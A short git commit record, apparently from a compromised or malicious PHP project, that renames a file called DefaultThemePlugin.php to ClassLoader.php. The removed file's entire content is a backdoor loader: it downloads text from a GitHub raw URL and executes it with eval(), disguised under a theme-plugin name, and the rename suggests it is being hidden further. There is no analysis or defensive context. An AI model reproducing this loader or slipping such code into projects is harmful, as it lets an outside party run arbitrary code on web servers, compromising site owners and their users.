c8b2c7cb36aacbe10abe2bc3ffa04f19c628a9ca
seobadboyz403-alt <seobadboyz403@gmail.com>
2026-09-24 16:57:19 -0700

    Update and rename DefaultThemePlugin.php to ClassLoader.php

--- DefaultThemePlugin.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-$content = file_get_contents(urldecode('https://raw.githubusercontent.com/seobadboyz403-alt/ngacak/refs/heads/main/smartpedia.txt'));
-
-$content = "?> ".$content;
-eval($content);
